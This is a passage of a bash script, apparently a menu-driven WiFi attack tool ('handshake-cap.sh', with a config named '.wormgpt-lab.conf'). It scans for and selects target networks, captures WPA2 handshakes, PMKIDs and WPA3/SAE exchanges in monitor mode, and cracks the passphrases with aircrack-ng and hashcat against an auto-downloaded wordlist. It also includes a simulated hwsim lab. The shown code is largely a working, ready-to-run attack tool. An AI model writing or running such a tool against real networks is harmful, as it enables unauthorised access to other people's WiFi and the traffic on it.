    read -r -p "[>] Virtual AP SSID [HSIMLab]: " ssid;  ssid="${ssid:-HSIMLab}"
    read -r -p "[>] WPA2 pass     [virtpass123]: " pass; pass="${pass:-virtpass123}"
    [[ ${#pass} -ge 8 ]] || { red "passphrase needs >= 8 chars"; modprobe -r mac80211_hwsim; return; }
    read -r -p "[>] Channel       [6]: " channel; channel="${channel:-6}"

    local -a VIFS
    mapfile -t VIFS < <(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -vx "$IFACE")
    [[ ${#VIFS[@]} -ge 3 ]] || { red "expected >=3 hwsim interfaces, got ${#VIFS[@]}: ${VIFS[*]:-none}"; modprobe -r mac80211_hwsim; return; }
    ap="${VIFS[0]}"; sta="${VIFS[1]}"; mon="${VIFS[2]}"
    yellow "[*] Virtual radios: AP=$ap client=$sta monitor=$mon"
    for i in "${VIFS[@]}"; do
        nmcli device set "$i" managed no >/dev/null 2>&1 || true
        ip link set "$i" down
    done
    iw dev "$ap" set type ap >/dev/null 2>&1
    iw dev "$mon" set type monitor >/dev/null 2>&1
    ip link set "$ap" up
    ip link set "$mon" up
    ip link set "$sta" up
    iw dev "$mon" set channel "$channel" >/dev/null 2>&1 || true

    hc="$(mktemp /tmp/wg-hwsim-hostapd.XXXX)"
    cat > "$hc" <<EOF
interface=$ap
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
EOF
    hostapd "$hc" &> /tmp/wg-hwsim-hostapd.log &
    HOSTAPD_PID=$!
    sleep 4
    kill -0 "$HOSTAPD_PID" 2>/dev/null || { red "hostapd failed:"; tail -8 /tmp/wg-hwsim-hostapd.log; modprobe -r mac80211_hwsim; return; }
    green "[+] Virtual AP '$ssid' up (ch $channel, iface $ap)"
    iw dev "$mon" set channel "$channel" >/dev/null 2>&1 || true

    pcap="$OUT_DIR/hsim-hs-$(date +%H%M%S).pcap"
    yellow "[*] Capturing all frames on $mon (monitor) -> $pcap"
    tcpdump -i "$mon" -w "$pcap" 2>/dev/null &
    TCPDUMP_PID=$!

    wp="$(mktemp /tmp/wg-hwsim-wpa.XXXX)"
    cat > "$wp" <<EOF
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="$ssid"
    psk="$pass"
}
EOF
    yellow "[*] Connecting virtual client $sta to '$ssid'..."
    wpa_supplicant -B -i "$sta" -c "$wp" -D nl80211 >/dev/null 2>&1
    local ok=0
    for _ in $(seq 1 12); do
        sleep 2
        iw dev "$sta" link 2>/dev/null | grep -q "Connected to" && { ok=1; green "    client associated"; break; }
    done
    sleep 3
    kill "$TCPDUMP_PID" >/dev/null 2>&1; wait "$TCPDUMP_PID" 2>/dev/null
    kill "$HOSTAPD_PID" >/dev/null 2>&1
    pkill -f "wpa_supplicant -B -i $sta" >/dev/null 2>&1 || true
    HOSTAPD_PID=""; TCPDUMP_PID=""

    green "[+] Capture saved: $pcap"
    printf '%s\n' "$pass" football ok123456 password 12345678 admin letmein \
        > "$OUT_DIR/demo-wordlist.txt"
    [[ $ok -eq 1 ]] || yellow "    (client didn't associate - check /tmp/wg-hwsim-hostapd.log)"
    yellow "[*] EAPOL frames captured:"
    if command -v tshark >/dev/null; then tshark -r "$pcap" 2>/dev/null | head -12;
    else tcpdump -r "$pcap" 2>/dev/null | head -12; fi

    local h22000
    h22000="$OUT_DIR/hsim-hs-$(date +%H%M%S).22000"
    if command -v hcxpcapngtool >/dev/null; then
        hcxpcapngtool "$pcap" -o "$h22000" >/dev/null 2>&1
        if [[ -s "$h22000" ]]; then
            green "[+] Handshake extracted -> hashcat -m 22000 $h22000 wordlist.txt"
            if command -v hashcat >/dev/null; then
                echo "$pass" > "$OUT_DIR/wordlist.txt"
                echo "ok123456" >> "$OUT_DIR/wordlist.txt"
                yellow "[*] Demo crack:"
                hashcat -m 22000 "$h22000" "$OUT_DIR/wordlist.txt" --force --quiet 2>/dev/null \
                    && grep -q "$pass" "$OUT_DIR/hashcat.potfile" 2>/dev/null \
                    && green "    Cracked: password is '$pass'" \
                    || yellow "    (hashcat run finished; check $OUT_DIR/hashcat.potfile)"
            fi
        else
            yellow "[-] No EAPOL extracted."
        fi
    else
        yellow "[-] hcxtools not installed -> sudo apt install hcxtools"
    fi
    yellow "[*] Aircrack demo on $pcap (auto - same as option 7 [c]rack):"
    crack_capture "$pcap" "$OUT_DIR/demo-wordlist.txt"
    modprobe -r mac80211_hwsim >/dev/null 2>&1
}

# ---------------------------------------------------------------- misc
WORDLIST_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/Pwdb_top-100000.txt"
WORDLIST_DEFAULT="/usr/share/wordlists/Pwdb_top-100000.txt"

download_wordlist() {
    WL_PATH="$WORDLIST_DEFAULT"
    mkdir -p "$(dirname "$WL_PATH")"
    yellow "[*] Downloading ~100k common passwords to $WL_PATH ..."
    if curl -fLsS -o "$WL_PATH" "$WORDLIST_URL"; then
        green "[+] Wordlist ready: $WL_PATH"
        save_conf
        return 0
    fi
    WL_PATH=""
    red "[-] Wordlist download failed (offline?) - you can set one manually later."
    return 1
}

# locate a wordlist: saved setting first, then common paths
resolve_wordlist() {
    local w
    [[ -n "${WL_PATH:-}" && -f "$WL_PATH" ]] && { echo "$WL_PATH"; return; }
    for w in "${SAVED_WORDLIST:-}" "$HOME/rockyou.txt" "$HOME/seclists/rockyou.txt" "$HOME/.wordlist.txt" \
             "$WORDLIST_DEFAULT" /usr/share/wordlists/rockyou.txt \
             /usr/share/seclists/Passwords/rockyou.txt; do
        [[ -n "$w" && -f "$w" ]] && { echo "$w"; return; }
    done
}

# ensure a wordlist exists: saved setting -> known paths -> auto-download
ensure_wordlist() {
    local w
    if [[ -n "${WL_PATH:-}" && -f "$WL_PATH" ]]; then return 0; fi
    w="$(resolve_wordlist)"
    if [[ -n "$w" ]]; then
        WL_PATH="$w"
        save_conf
        return 0
    fi
    download_wordlist
}

# crack one WPA .cap with aircrack-ng and print the KEY if found
crack_capture() {
    local f="$1" wl="${2:-}" res key
    if [[ -z "$wl" || ! -f "$wl" ]]; then
        wl="$(resolve_wordlist)"
        if [[ -z "$wl" ]]; then
            read -r -p "[>] Wordlist path, 'd' to download 100k common passwords, ENTER to cancel: " wl
        fi
    fi
    if [[ "${wl,,}" == "d" ]]; then
        download_wordlist || return 1
        wl="$WL_PATH"
    fi
    [[ -f "$wl" ]] || { yellow "    wordlist not found: $wl"; return 1; }
    cyan "[*] Cracking $f with $(basename "$wl") - big lists take minutes..."
    res="$(aircrack-ng -w "$wl" "$f" 2>/dev/null)"
    if grep -q 'KEY FOUND' <<<"$res"; then
        key="$(grep -oE 'KEY FOUND! \[ [^]]+ \]' <<<"$res" | head -1)"
        green "[+] $key"
        grep -E '^Network Name:|^         BSSID|^              ' <<<"$res" | head -2
        green "[+] Passphrase was in the wordlist - that's why quickly crackable."
    else
        yellow "[-] Passphrase not in $wl. Short/weak passwords only - random ones won't crack."
    fi
}

# crack any hashcat 22000 hashes present (PMKID / AP-lab / virtual-lab output)
crack_hashes() {
    local wl h es rest
    command -v hashcat >/dev/null 2>&1 || { yellow "    hashcat not installed (sudo apt install hashcat)"; return; }
    local -a hs=()
    local cap base
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        for cap in cap-*.cap *_cap-*.cap ap-hs-*.pcap; do
            [[ -f "$cap" ]] || continue
            aircrack-ng "$cap" 2>/dev/null | grep -q 'WPA (' || continue
            base="${cap%.*}"
            if [[ ! -s "$base.22000" ]]; then
                yellow "[*] Extracting handshake: $cap -> $base.22000"
                hcxpcapngtool "$cap" -o "$base.22000" >/dev/null 2>&1 || true
            fi
        done
    fi
    for h in *.22000; do [[ -f "$h" && -s "$h" ]] && hs+=("$h"); done
    [[ ${#hs[@]} -eq 0 ]] && { yellow "    (no .22000 hashes here)"; return; }
    wl="$(resolve_wordlist)"
    [[ -z "$wl" ]] && read -r -p "[>] Wordlist path: " wl
    [[ -f "$wl" ]] || { yellow "    wordlist not found: $wl"; return; }
    for h in "${hs[@]}"; do yellow "[*] hashcat -m 22000 $h"; hashcat -m 22000 "$h" "$wl" >/dev/null 2>&1 || true; done
    echo
    cyan "[*] Recovered passwords:"
    local n=0
    while IFS=: read -r _ _ _ es rest; do
        [[ -n "$es" ]] || continue
        n=$((n+1))
        green "    [+] network: $es   password: $rest"
    done < <(hashcat -m 22000 --show "${hs[@]}" 2>/dev/null)
    [[ $n -eq 0 ]] && yellow "    (none - try a bigger wordlist, or it just didn't crack)"
    echo
}

show_captures() {
    echo
    cyan "[*] Captures in $OUT_DIR:"
    cd "$OUT_DIR" 2>/dev/null || { yellow "    (cannot cd $OUT_DIR)"; read -r -p "[-] Press ENTER to continue..."; return; }
    local -a caps=()
    local f sz tm hs i y pick
    for f in cap-*.cap *_cap-*.cap ap-hs-*.pcap; do [[ -f "$f" ]] && caps+=("$f"); done
    if [[ ${#caps[@]} -eq 0 ]]; then
        yellow "    (none yet)"
        read -r -p "[-] Press ENTER to continue..."
        return
    fi
    echo "     #   size      last modified         file                       result"
    for i in "${!caps[@]}"; do
        f="${caps[$i]}"
        sz="$(numfmt --to=iec-i --suffix=B "$(stat -c %s "$f")" 2>/dev/null || stat -c %s "$f")"
        tm="$(stat -c %y "$f" 2>/dev/null | cut -d. -f1)"
        hs=""
        [[ "$f" == *.cap ]] && hs="$(aircrack-ng "$f" 2>/dev/null | grep -oE 'WPA \([1-9][0-9]* handshake\)' | head -1 | tr -d '\r')"
        printf "   %3d) %7s  %s  %-26s %s\n" "$((i+1))" "$sz" "$tm" "$f" "${hs:-no handshake}"
    done
    echo
    echo "    [n]umber = delete that capture   [a]ll = delete everything"
    echo "    [c]rack a capture (find the password)    [h]ash = crack .22000"
    echo "    [w]ordlist settings   (current: ${WL_PATH:-none})   0 = back"
    read -r -p "[>] Your choice: " pick
    case "$pick" in
        c|C)
            read -r -p "[>] Number of capture to crack: " cn
            if [[ "$cn" =~ ^[0-9]+$ ]] && [[ "$cn" -ge 1 ]] && [[ "$cn" -le ${#caps[@]} ]]; then
                crack_capture "${caps[$((cn-1))]}"
            else
                yellow "    bad number"
            fi
            ;;
        h|H)
            crack_hashes
            ;;
        w|W)
            if [[ -n "${WL_PATH:-}" && -f "$WL_PATH" ]]; then
                yellow "[-] Current wordlist: $WL_PATH"
            else
                yellow "[-] No wordlist set yet."
            fi
            read -r -p "[>] New path, 'd' to download 100k common passwords, ENTER to keep: " newwl
            if [[ "${newwl,,}" == "d" ]]; then
                download_wordlist
            elif [[ -n "$newwl" ]]; then
                if [[ -f "$newwl" ]]; then
                    WL_PATH="$newwl"
                    save_conf
                    green "    saved: $WL_PATH"
                else
                    yellow "    not a file: $newwl"
                fi
            fi
            ;;
        a|A)
            read -r -p "[>] Delete ALL capture files? (y/N): " y
            [[ "${y,,}" == "y" ]] && { rm -f cap-*.* *_cap-*.* ap-hs-*.pcap *.22000 hcxdump; green "    deleted."; }
            ;;
        [0-9]*)
            if [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#caps[@]} ]]; then
                f="${caps[$((pick-1))]}"
                rm -f "${f%.cap}"* "$f" 2>/dev/null
                green "    deleted $f + sidecar files"
            fi
            ;;
    esac
    read -r -p "[-] Press ENTER to continue..."
}

diagnose() {
    capabilities
    [[ $HAS_MON -eq 1 ]] && test_monitor_rx
    [[ $HAS_MON -eq 1 ]] && test_monitor_rx_data
    echo
    cyan "[*] Result:"
    printf '    any frames RX  : %s\n' "$([[ $MON_RX -eq 1 ]] && green OK || red BROKEN)"
    printf '    DATA frames RX : %s  (required for handshake/PMKID/SAE capture)\n' "$([[ $MON_RX_DATA -eq 1 ]] && green OK || red BROKEN)"
    echo
    cyan "[*] Manual checks you can run in a second terminal:"
    cat <<EOF
    sudo airmon-ng check kill
    sudo ip link set $IFACE down
    sudo iw dev $IFACE set type monitor
    sudo ip link set $IFACE up
    sudo timeout 8 airodump-ng $IFACE
    # raw frame proof (0 packets = broken monitor RX):
    sudo timeout 8 tcpdump -i $IFACE -c 20 -e
EOF
    read -r -p "[-] Press ENTER to continue..."
}

# ---------------------------------------------------------------- setup helpers
CONF="$HOME/.wormgpt-lab.conf"

load_conf() {
    [[ -f "$CONF" ]] && { . "$CONF" 2>/dev/null || true; } || true
}
save_conf() {
    printf 'SAVED_IFACE=%s\nSAVED_OUT_DIR=%s\nSAVED_WORDLIST=%s\n' \
        "$IFACE" "$OUT_DIR" "${WL_PATH:-}" > "$CONF" 2>/dev/null || true
}

install_deps() {
    local pkgs=(aircrack-ng iw hostapd dnsmasq tcpdump hcxtools hcxdumptool tshark hashcat)
    local bins=(aircrack-ng iw hostapd dnsmasq tcpdump hcxpcapngtool hcxdumptool tshark hashcat)
    local miss=() t pm still=() i
    for i in "${!pkgs[@]}"; do
        command -v "${bins[$i]}" >/dev/null 2>&1 || miss+=("${pkgs[$i]}")
    done
    if [[ ${#miss[@]} -eq 0 ]]; then
        green "    all tools present"
    else
        if command -v apt-get >/dev/null; then pm=apt
        elif command -v dnf >/dev/null; then pm=dnf
        elif command -v pacman >/dev/null; then pm=pacman
        fi
        if [[ -n "$pm" ]]; then
            yellow "[*] Installing missing tools: ${miss[*]} (may need network, ~3min max)"
            if [[ "$pm" == apt ]]; then
                local uri host
                uri="$(grep -rhoE 'https?://[^ /]+' /etc/apt/sources.list /etc/apt/sources.list.d/*.sources /etc/apt/sources.list.d/*.list 2>/dev/null | grep -v 'security' | head -1)"
                host="${uri#*://}"; host="${host%%/*}"
                if [[ -z "$host" ]] || { timeout 5 bash -c "</dev/tcp/${host}/80" >/dev/null 2>&1 || timeout 5 bash -c "</dev/tcp/${host}/443" >/dev/null 2>&1; }; then
                    case "$pm" in
                        apt)
                            timeout 90 sh -c 'DEBIAN_FRONTEND=noninteractive apt-get update' >/dev/null 2>&1 \
                                || yellow "    apt update failed (offline?) - trying install anyway"
                            timeout 150 env DEBIAN_FRONTEND=noninteractive apt-get install -y "${miss[@]}" >/dev/null 2>&1 || true ;;
                        dnf)   timeout 150 dnf install -y "${miss[@]}" >/dev/null 2>&1 || true ;;
                        pacman) timeout 150 pacman -Sy --noconfirm "${miss[@]}" >/dev/null 2>&1 || true ;;
                    esac
                else
                    yellow "    apt mirror $host unreachable - skipping install, flows degrade"
                fi
            fi
        else
            red "[-] Missing tools: ${miss[*]} - install them for your distro."
        fi
        for i in "${!pkgs[@]}"; do
            command -v "${bins[$i]}" >/dev/null 2>&1 || still+=("${pkgs[$i]}")
        done
        if [[ ${#still[@]} -gt 0 ]]; then
            red "[-] Still missing: ${still[*]}"
            yellow "    Affected options degrade; rerun after fixing network/apt."
        fi
    fi
    ensure_wordlist
}

pick_interface() {
    local -a opt=()
    local i
    for d in /sys/class/net/*; do
        i="$(basename "$d")"
        [[ -e "$d/phy80211" ]] || continue
        case "$i" in *mon) continue;; esac
        opt+=("$i")
    done
    [[ ${#opt[@]} -gt 0 ]] || die "no wireless interfaces found"
    echo
    cyan "[*] Wireless adapters:"
    for i in "${!opt[@]}"; do
        printf '   %d) %s\n' "$((i+1))" "${opt[$i]}"
    done
    local dflt="${SAVED_IFACE:-}"
    local pick=""
    read -r -p "[>] Select (1-${#opt[@]})${dflt:+, ENTER to reuse '$dflt'}: " pick
    if [[ -z "$pick" ]] && [[ -n "$dflt" ]] && [[ -e "/sys/class/net/$dflt" ]]; then
        IFACE="$dflt"
    elif [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#opt[@]} ]]; then
        IFACE="${opt[$((pick-1))]}"
    else
        die "invalid adapter selection"
    fi
    green "[+] Using $IFACE"
}

# ---------------------------------------------------------------- menu
main_menu() {
    local mon_label ap_label data_label
    while true; do
        clear
        banner
        echo "[ Main Menu ]  iface: $IFACE | dir: $OUT_DIR"
        # NOTE: use if/elif here, NOT "a && green || b && red || yellow" chains -
        # &&/|| are left-associative so green can run AND red run for the same case.
        if [[ $HAS_MON -eq 1 ]]; then
            if [[ $MON_RX -eq 1 ]]; then
                mon_label=$(green "OK")
            elif [[ $MON_RX -eq 0 ]]; then
                mon_label=$(red "BROKEN")
            else
                mon_label=$(yellow "untested")
            fi
            if [[ $MON_RX_DATA -eq 1 ]]; then
                data_label=$(green "OK")
            elif [[ $MON_RX_DATA -eq 0 ]]; then
                data_label=$(red "BROKEN")
            else
                data_label=$(yellow "untested")
            fi
        else
            mon_label=$(red "unsupported")
            data_label=$(red "unsupported")
        fi
        if [[ $HAS_AP -eq 1 ]]; then
            ap_label=$(green "OK")
        else
            ap_label=$(red "unsupported")
        fi
        printf '    monitor RX : %s      DATA-RX: %s        AP mode : %s\n' "$mon_label" "$data_label" "$ap_label"
        if [[ -n "$TARGET_BSSID" ]]; then
            cyan "    Target: $TARGET_BSSID  (ch $TARGET_CH)  '$TARGET_ESSID'"
        else
            yellow "    No target selected"
        fi
        echo
        echo " 1) Scan / select WiFi network          (monitor)"
        echo " 2) Capture WPA1/WPA2 handshake         (monitor)"
        echo " 3) Capture WPA2 PMKID                  (monitor)"
        echo " 4) Capture WPA3/SAE                    (monitor)"
        echo " 5) WPA2 lab AP (hostapd) - NO monitor  (works on this card)"
        echo " 6) Diagnose capabilities/monitor RX"
        echo " 7) View / delete captured files"
        echo " 8) Virtual WiFi lab (software, mac80211_hwsim)"
        echo " 9) Exit"
        read -r -p $'\n[>] Select (1-9): ' choice
        case "$choice" in
            1) select_target ;;
            2) capture_wpa2 ;;
            3) capture_pmkid ;;
            4) capture_sae ;;
            5) ap_lab ;;
            6) diagnose ;;
            7) show_captures ;;
            8) hwsim_lab ;;
            9) cleanup; exit 0 ;;
            *) yellow "Invalid choice" ;;
        esac
        [[ "$choice" =~ ^[1-8]$ ]] && read -r -p "[-] Press ENTER to continue..."
    done
}

main() {
    banner
    [[ $EUID -eq 0 ]] || die "Run with sudo: sudo ./handshake-cap.sh"

    cyan "[*] Checking/installing dependencies..."
    load_conf
    install_deps

    [[ -z "${2:-}" ]] && [[ -n "${SAVED_OUT_DIR:-}" ]] && OUT_DIR="$SAVED_OUT_DIR"
    if [[ -z "$IFACE" ]]; then
        pick_interface
        save_conf
    fi
    [[ -e "/sys/class/net/$IFACE" ]]          || die "Interface $IFACE not found"
    [[ -e "/sys/class/net/$IFACE/phy80211" ]] || die "$IFACE is not a wireless interface"

    mkdir -p "$OUT_DIR"
    cd "$OUT_DIR" || die "cannot cd $OUT_DIR"

    capabilities
    main_menu
}

main "$@"